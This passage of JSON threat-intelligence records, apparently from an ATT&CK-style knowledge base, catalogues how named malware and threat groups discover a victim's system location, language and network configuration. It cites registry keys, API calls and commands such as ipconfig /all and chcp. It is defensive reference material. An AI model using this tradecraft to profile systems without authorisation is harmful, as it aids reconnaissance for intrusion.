name on a compromised host."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN collects the OS name, machine name, and architecture information."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer can gather system information, the computer name, OS version, drive and serial information from the victim's machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has discovered file system types, drive names, size, and free space on compromised systems."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can collect compromised host information, including OS version, PC name, RAM size, and CPU details."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can identify the computer name of a compromised host."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate has the ability to enumerate fixed logical drives on a targeted system."}, {"id": "G0124", "name": "Windigo", "description": "Windigo has used a script to detect which Linux distribution and version is currently installed on the system."}, {"id": "S0155", "name": "WINDSHIELD", "description": "WINDSHIELD can gather the victim computer name."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used malware to identify the computer name of a compromised host."}, {"id": "S0219", "name": "WINERACK", "description": "WINERACK can gather information about the host."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit."}, {"id": "S0059", "name": "WinMM", "description": "WinMM collects the system name, OS version including service pack, and system install date and sends the information to the C2 server."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can determine if the OS on a compromised host is newer than Windows XP."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern script execution includes basic victim information gathering steps which are then transmitted to command and control servers."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used Systeminfo and similar commands to acquire detailed configuration information of a victim's machine. Wizard Spider has also utilized the PowerShell cmdlet Get-ADComputer to collect DNS hostnames, last logon dates, and operating system information from Active Directory."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can retrieve the following information from an infected machine: OS, architecture, computer name, OS build version, environment variables, and storage drives."}, {"id": "S0161", "name": "XAgentOSX", "description": "XAgentOSX contains the getInstalledAPP function to run ls -la /Applications to gather what applications are installed."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET identifies the macOS version and uses ioreg to determine serial number."}, {"id": "S0388", "name": "YAHOYAH", "description": "YAHOYAH checks for the system\u2019s Windows OS version and hostname."}, {"id": "S0248", "name": "yty", "description": "yty gathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the command systeminfo."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy collects the OS version, computer name and serial number for the storage volume C:. Zebrocy also runs the systeminfo command to gather system information. "}, {"id": "S1151", "name": "ZeroCleare", "description": "ZeroCleare can use the IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, IOCTL_DISK_GET_DRIVE_GEOMETRY, and IOCTL_DISK_GET_LENGTH_INFO system calls to compute disk size."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT gathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda collects the OS version, system architecture, computer name, product ID, install date, and information on the keyboard mapping to determine the language used on the system."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used a tool to capture the processor architecture of a compromised host in order to register it with C2."}, {"id": "S0086", "name": "ZLib", "description": "ZLib has the ability to enumerate system information."}, {"id": "S0672", "name": "Zox", "description": "Zox can enumerate attached drives."}, {"id": "S0350", "name": "zwShell", "description": "zwShell can obtain the victim PC name and OS version."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can collect the local hostname, operating system details, CPU speed, and total physical memory."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ has collected the host name and operating system product name from a compromised machine."}], "sub_techniques": []}, {"name": "System Location Discovery", "description": "Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from System Location Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "detailed_description": "Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from System Location Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings. Windows API functions such as GetLocaleInfoW can also be used to determine the locale of the host. In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.", "id": "T1614", "examples": [{"id": "S1025", "name": "Amadey", "description": "Amadey does not run any tasks or install additional malware if the victim machine is based in Russia."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can identify the geographical location of a victim host."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can determine the geographical location of a victim host by checking the language."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate queries system locale information during execution. Later versions of DarkGate query GetSystemDefaultLCID for locale information to determine if the malware is executing in Russian-speaking countries."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can identity the OS locale of a compromised host."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader  can use IP geolocation to determine if the person browsing to a compromised site is within a targeted territory such as the US, Canada, Germany, and South Korea."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can identify the country code on a compromised host."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can determine the country a victim host is located in."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer collects the Locale Name of the infected device via GetUserDefaultLocaleName to determine whether the string ru is included, but in analyzed samples no action is taken if present."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Before executing malicious code, Ragnar Locker checks the Windows API GetLocaleInfoW and doesn't encrypt files if it finds a former Soviet country."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has conducted system locale checks to see if the compromised host is in Russia, Ukraine, Belarus, Armenia, Kazakhstan, or Moldova."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot can collected the country code of a compromised machine."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has identified the country location of a compromised host."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish can use IP-based geolocation to limit infections to victims in North America, Europe, and a small number of Asian-Pacific nations."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has obtained the victim's system current location."}], "sub_techniques": [{"name": "System Language Discovery", "description": "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.", "detailed_description": "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions.\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language or parsing the outputs of Windows API functions GetUserDefaultUILanguage, GetSystemDefaultUILanguage, GetKeyboardLayoutList and GetUserDefaultLangID.\nOn a macOS or Linux system, adversaries may query locale to retrieve the value of the $LANG environment variable.", "id": "T1614.001", "examples": [{"id": "S0640", "name": "Avaddon", "description": "Avaddon checks for specific keyboard layouts and OS languages to avoid targeting Commonwealth of Independent States (CIS) entities."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can perform a check to ensure that the operating system's keyboard and language settings are not set to Russian."}, {"id": "S0611", "name": "Clop", "description": "Clop has checked the keyboard language using the GetKeyboardLayout() function to avoid installation on Russian-language or other Commonwealth of Independent States-language machines; it will also check the GetTextCharset function."}, {"id": "S0625", "name": "Cuba", "description": "Cuba can check if Russian language is installed on the infected machine by using the function GetKeyboardLayoutList."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can check the systems LANG environmental variable to prevent infecting devices from Armenia (hy_AM), Belarus (be_BY), Kazakhstan (kk_KZ), Russia (ru_RU), and Ukraine (uk_UA)."}, {"id": "S0616", "name": "DEATHRANSOM", "description": "Some versions of DEATHRANSOM have performed language ID and keyboard layout checks; if either of these matched Russian, Kazakh, Belarusian, Ukrainian or Tatar DEATHRANSOM would exit."}, {"id": "S0547", "name": "DropBook", "description": "DropBook has checked for the presence of Arabic language in the infected machine's settings."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro can check whether the target system is using Japanese, Taiwanese, or English through detection of specific Windows Security and Internet Explorer dialog."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can determine if a victim's computer is running an operating system with specific language preferences."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent has used Accept-Language to identify hosts in the United Kingdom, United States, France, and Spain."}, {"id": "S0483", "name": "IcedID", "description": "IcedID used the following command to check the country/language of the active console: cmd.exe /c chcp >&2."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used implants to collect the system language ID of a compromised machine."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro will terminate Mispadu's infection process if the language of the victim machine is not Spanish or Portuguese."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can use the GetKeyboardLayout API to check if a compromised host's keyboard is set to Persian."}, {"id": "S0449", "name": "Maze", "description": "Maze has checked the language of the machine with function GetUserDefaultUILanguage and terminated execution if the language matches with an entry in the predefined list."}, {"id": "S0083", "name": "Misdat", "description": "Misdat has attempted to detect if a compromised host had a Japanese keyboard via the Windows API call GetKeyboardType."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu checks and will terminate execution if the compromised system\u2019s language ID is not Spanish or Portuguese."}, {"id": "S0691", "name": "Neoichor", "description": "Neoichor can identify the system language on a compromised host."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group deployed malware designed not to run on computers set to Korean, Japanese, or Chinese in Windows language preferences."}, {"id": "S0496", "name": "REvil", "description": "REvil can check the system language using GetUserDefaultUILanguage and GetSystemDefaultUILanguage. If the language is found in the list, the process terminates."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has been observed to query the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language and the value InstallLanguage. If the machine has the value 0x419 (Russian), 0x422 (Ukrainian), or 0x423 (Belarusian), it stops execution."}, {"id": "S0085", "name": "S-Type", "description": "S-Type has attempted to determine if a compromised system was using a Japanese keyboard via the GetKeyboardType API call."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage  has been used to target Arabic-speaking users and used code that checks if the compromised machine has the Arabic language installed."}, {"id": "S0543", "name": "Spark", "description": "Spark has checked the results of the GetKeyboardLayoutList and the language name returned by GetLocaleInfoA to make sure they contain the word \"Arabic\" before executing."}, {"id": "S0242", "name": "SynAck", "description": "SynAck lists all the keyboard layouts installed on the victim\u2019s system using GetKeyboardLayoutList API and checks against a hardcoded language code list. If a match if found, SynAck sleeps for 300 seconds and then exits without encrypting files."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET uses AppleScript to check the host's language and location with the command user locale of (get system info)."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda queries the system's keyboard mapping to determine the language used on the system. It will terminate execution if it detects LANG_RUSSIAN, LANG_BELARUSIAN, LANG_KAZAK, or LANG_UKRAINIAN."}]}]}, {"name": "System Network Configuration Discovery", "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.", "detailed_description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.", "id": "T1016", "examples": [{"id": "S1028", "name": "Action RAT", "description": "Action RAT has the ability to collect the MAC address of an infected host."}, {"id": "S0552", "name": "AdFind", "description": "AdFind can extract subnet information from Active Directory."}, {"id": "G0018", "name": "admin@338", "description": "admin@338 actors used the following command after exploiting a machine with LOWBALL malware to acquire information about local networks: ipconfig /all >> %temp%\\download"}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings."}, {"id": "S0092", "name": "Agent.btz", "description": "Agent.btz collects the network adapter\u2019s IP and MAC address as well as IP addresses of the network adapter\u2019s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file."}, {"id": "S1025", "name": "Amadey", "description": "Amadey can identify the IP address of a victim machine."}, {"id": "S0504", "name": "Anchor", "description": "Anchor can determine the public IP and location of a compromised host."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can identify the IP of a targeted system."}, {"id": "G0006", "name": "APT1", "description": "APT1 used the ipconfig /all command to gather network configuration information."}, {"id": "G0073", "name": "APT19", "description": "APT19 used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim\u2019s machine."}, {"id": "G0022", "name": "APT3", "description": "A keylogging tool used by APT3 gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway."}, {"id": "G0050", "name": "APT32", "description": "APT32 used the ipconfig /all command to gather the IP address from the system."}, {"id": "G0096", "name": "APT41", "description": "APT41 collected MAC addresses from victim machines."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to identify the location, public IP address, and domain name on a compromised host."}, {"id": "S0099", "name": "Arp", "description": "Arp can be used to display ARP configuration information on the host."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth collects the external IP address from the system. "}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon can collect the external IP address of the victim."}, {"id": "S0473", "name": "Avenger", "description": "Avenger can identify the domain of the compromised host."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can collect host IP information from the victim\u2019s machine."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has executed the ipconfig /all command."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea collects information about the Internet adapter configuration."}, {"id": "S0245", "name": "BADCALL", "description": "BADCALL collects the network adapter information."}, {"id": "S0642", "name": "BADFLICK", "description": "BADFLICK has captured victim IP address details."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has a command to get the public IP address from a system."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can collect the IP address and NetBIOS name of an infected machine."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal can execute ipconfig on the victim\u2019s machine."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has gathered information about network IP configurations using ipconfig.exe and about routing tables using route.exe."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has collected the victim machine's local IP address information and MAC address."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can collect IP information from the victim\u2019s machine."}, {"id": "S0486", "name": "Bonadan", "description": "Bonadan can find the external IP address of the infected host."}, {"id": "S0651", "name": "BoxCaon", "description": "BoxCaon can collect the victim's MAC address by using the GetAdaptersInfo API."}, {"id": "S0252", "name": "Brave Prince", "description": "Brave Prince gathers network configuration information as well as the ARP cache."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used code to obtain the external public-facing IPv4 address of the compromised host."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used cmd.exe /c ping %userdomain% for discovery."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors ran nslookup and Advanced IP Scanner on the target network."}, {"id": "S0274", "name": "Calisto", "description": "Calisto runs the ifconfig command to obtain the IP address from the victim\u2019s machine."}, {"id": "S0335", "name": "Carbon", "description": "Carbon can collect the IP address of the victims and other computers on the network using the commands: ipconfig -all nbtstat -n, and nbtstat -s."}, {"id": "S0261", "name": "Catchamas", "description": "Catchamas gathers the Mac address, IP address, and the network adapter information from the victim\u2019s machine."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell can gather the IP address from the victim's machine using the IP config command."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower has the ability to use ipconfig to enumerate system network settings."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used ipconfig, Ping, and tracert to enumerate the IP address and network environment and settings of the local host."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme can enumerate the IP address of a compromised host."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can enumerate the IP address of a compromised machine."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can determine the NetBios name and  the IP addresses of targets machines including domain controllers."}, {"id": "S0244", "name": "Comnie", "description": "Comnie uses ipconfig /all and route PRINT to identify network adapter and interface information."}, {"id": "S0575", "name": "Conti", "description": "Conti can retrieve the ARP cache from the local system by using the GetIpNetTable() API call and check to ensure IP addresses it connects to are for local, non-Internet, systems."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can collect DNS information from the targeted system."}, {"id": "S1024", "name": "CreepySnail", "description": "CreepySnail can use getmac and Get-NetIPAddress to enumerate network settings."}, {"id": "S0115", "name": "Crimson", "description": "Crimson contains a command to collect the victim MAC address and LAN IP."}, {"id": "S0625", "name": "Cuba", "description": "Cuba can retrieve the ARP cache from the local system by using GetIpNetTable."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can use the Linux API if_nameindex to gather network interface names."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has collected the IP address and network adapter information from the victim\u2019s machine."}, {"id": "S1052", "name": "DEADEYE", "description": "DEADEYE can discover the DNS domain name of a targeted system."}, {"id": "S0354", "name": "Denis", "description": "Denis uses ipconfig to gather the IP address from the system."}, {"id": "S0659", "name": "Diavol", "description": "Diavol can enumerate victims' local and external IPs when registering with C2."}, {"id": "S0472", "name": "down_new", "description": "down_new has the ability to identify the MAC address of a compromised host."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used batch scripts to enumerate network information, including information about trusts, zones, and the domain."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack can collect the host's IP addresses using the ipconfig command."}, {"id": "S0038", "name": "Duqu", "description": "The reconnaissance modules used with Duqu can collect information on network configuration."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can enumerate infected system network information."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has the ability to identify network settings on a compromised host."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca used the command ipconfig to obtain information about network configurations."}, {"id": "S0605", "name": "EKANS", "description": "EKANS can determine the domain of a compromised host."}, {"id": "S0081", "name": "Elise", "description": "Elise executes ipconfig /all after initial communication is made to the remote server."}, {"id": "S0082", "name": "Emissary", "description": "Emissary has the capability to execute the command ipconfig /all."}, {"id": "S0363", "name": "Empire", "description": "Empire can acquire network configuration information like DNS servers, public IP, and network proxies used by a host."}, {"id": "S0091", "name": "Epic", "description": "Epic uses the nbtstat -n and nbtstat -s commands on the victim\u2019s machine."}, {"id": "S0569", "name": "Explosive", "description": "Explosive has collected the MAC address from the victim's machine."}, {"id": "S0181", "name": "FALLCHILL", "description": "FALLCHILL collects MAC address and local IP address information from the victim."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can identify the MAC address on the target computer."}, {"id": "S0171", "name": "Felismus", "description": "Felismus collects the victim LAN IP address and sends it to the C2 server."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT collects information about the network including the IP address and DHCP server."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used nslookup and ipconfig for network reconnaissance efforts. FIN13 has also utilized a compromised Symantec Altiris console and LanDesk account to retrieve network information."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has been used to execute the ipconfig /all command on a victim system."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used Empire to find the public IP address of a compromised system."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can parse the ProxyServer string in the Registry to discover http proxies."}, {"id": "C0007", "name": "FunnyDream", "description": "During FunnyDream, the threat actors used ipconfig for discovery on remote systems."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used ipconfig /all to obtain information about the victim network configuration. The group also ran a modified version of NBTscan to identify available NetBIOS name servers."}, {"id": "S0049", "name": "GeminiDuke", "description": "GeminiDuke collects information on network settings and Internet proxy settings from the victim."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax retrieved a list of the system's network interface after execution."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can use an embedded script to check the IP address of potential victims visiting compromised websites."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can determine the IP and physical location of the compromised host via IPinfo."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT collects the victim IP address, MAC address, as well as the victim account domain name."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can obtain proxy information from a victim's machine using system environment variables."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can enumerate the IP and domain of a target system."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has collected IP information via IPInfo."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used Ping and tracert for network discovery."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa used ipconfig to gather network configuration information."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to identify the IP address of the compromised machine."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines."}, {"id": "S1022", "name": "IceApple", "description": "The IceApple ifconfig module can iterate over all network interfaces on the host and retrieve the name, description, MAC address, DNS suffix, DNS servers, gateways, IPv4 addresses, and subnet masks."}, {"id": "S0483", "name": "IcedID", "description": "IcedID used the ipconfig /all command and a batch script to gather network information."}, {"id": "S0101", "name": "ifconfig", "description": "ifconfig can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP."}, {"id": "S0278", "name": "iKitten", "description": "iKitten will look for the current IP address."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer\u2019s 61850 payload component enumerates connected network adapters and their corresponding IP addresses."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole gathers information on the IP forwarding table, MAC address, configured proxy, and network SSID."}, {"id": "S0100", "name": "ipconfig", "description": "ipconfig can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe enumerates the IP address, network proxy settings, and domain name from a victim's system."}, {"id": "S0044", "name": "JHUHUGIT", "description": "A JHUHUGIT variant gathers network interface card information."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can obtain network information, including DNS, IP, and proxies."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can gather victim internal and external IPs."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar gathers information about network adapters."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has performed local network configuration discovery using ipconfig."}, {"id": "S0487", "name": "Kessel", "description": "Kessel has collected the DNS address of the infected host."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can collect the MAC address and other information from a victim machine using ipconfig/all."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy can determine the public or WAN IP address for the system."}, {"id": "S0271", "name": "KEYMARBLE", "description": "KEYMARBLE gathers the MAC address of the victim\u2019s machine."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used ipconfig/all and web beacons sent via email to gather network configuration information."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can retrieve the contents of the IP routing table as well as information about the Windows domain."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos can record the IP address of the target machine."}, {"id": "S0356", "name": "KONNI", "description": "KONNI can collect the IP address from the victim\u2019s machine."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK can use Arp to discover a target's network configuration setttings."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity gathers victim IP information during initial installation stages."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects network adapter and interface information by using the commands ipconfig /all, arp -a and route print. It also collects the system's MAC address with getmac and domain configuration with net config workstation."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can discover the IP and MAC address of a targeted host."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware IndiaIndia obtains and sends to its C2 server information about the first network interface card\u2019s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron gathers information about network adapters using the Win32 API call GetAdaptersInfo."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke has the ability to discover the proxy configuration of Firefox and/or Opera."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can retrieve network information from a compromised host."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has the ability to discover the domain name of the infected host."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner used a script to gather the IP address of the infected machine before sending to the C2."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can collect the IP address of a compromised host."}, {"id": "S1143", "name": "LunarLoader", "description": "LunarLoader can verify the targeted host's DNS name which is then used in the creation of a decyrption key."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can use shell commands to discover network adapters and configuration."}, {"id": "S0409", "name": "Machete", "description": "Machete collects the MAC address of the target computer and other network configuration information."}, {"id": "S1016", "name": "MacMa", "description": "MacMa can collect IP addresses from a compromised host."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can use the GetAdaptersInfo function to retrieve information about network adapters and the GetIpNetTable function to retrieve the IPv4 to physical network address mapping table."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware gathers the victim's local IP address, MAC address, and external IP address."}, {"id": "S1156", "name": "Manjusaka", "description": "Manjusaka gathers information about current network connections, local and remote addresses associated with them, and associated processes."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions."}, {"id": "S1015", "name": "Milan", "description": "Milan can run C:\\Windows\\system32\\cmd.exe /c cmd /c ipconfig /all 2>&1 to discover network settings."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type may create a file containing the results of the command cmd.exe /c ipconfig /all."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet has gathered information on victim network configuration."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind obtains the victim IP address."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs has the capability to gather the IP address from the victim's machine."}, {"id": "G1009", "name": "Moses Staff", "description": "Moses Staff has collected the domain name of a compromised network."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito uses the ipconfig command."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used malware to collect the victim\u2019s IP address and domain name."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used ipconfig and arp to determine network configuration information."}, {"id": "S0205", "name": "Naid", "description": "Naid collects the domain name from a compromised host."}, {"id": "G0019", "name": "Naikon", "description": "Naikon uses commands such as netsh interface show to discover network interface settings."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu can gather information about the victim proxy server."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore gathers the IP address from the victim\u2019s machine."}, {"id": "S0590", "name": "NBTscan", "description": "NBTscan can be used to collect MAC addresses."}, {"id": "S0102", "name": "nbtstat", "description": "nbtstat can be used to discover local NetBIOS domain names."}, {"id": "S0691", "name": "Neoichor", "description": "Neoichor can gather the IP address from an infected host."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can collect the IP address of a compromised host."}, {"id": "S1106", "name": "NGLite", "description": "NGLite identifies the victim system MAC and IPv4 addresses and uses these to establish a victim identifier."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor gathers information on victim system network configuration such as MAC addresses."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can enumerate the IP address on compromised systems."}, {"id": "S0359", "name": "Nltest", "description": "Nltest may be used to enumerate the parent domain of a local machine using /parentdomain."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI can gather information on the victim IP address."}, {"id": "S0346", "name": "OceanSalt", "description": "OceanSalt can collect the victim\u2019s IP address."}, {"id": "S0340", "name": "Octopus", "description": "Octopus can collect the host IP address from the victim\u2019s machine."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has run ipconfig /all on a victim."}, {"id": "S0439", "name": "Okrum", "description": "Okrum can collect network information, including the host IP address, DNS, and proxy information."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer uses API calls to enumerate the infected system's ARP table."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used ipconfig, nbtstat, tracert, route print, and cat /etc/hosts commands."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors discovered the local network configuration with ipconfig."}, {"id": "S0229", "name": "Orz", "description": "Orz can gather victim proxy information."}, {"id": "S0165", "name": "OSInfo", "description": "OSInfo discovers the current domain information."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D can collect the network interface MAC address on the infected host."}, {"id": "S0556", "name": "Pay2Key", "description": "Pay2Key can identify the IP and MAC addresses of the compromised host."}, {"id": "S1050", "name": "PcShare", "description": "PcShare can obtain the proxy settings of a compromised machine using 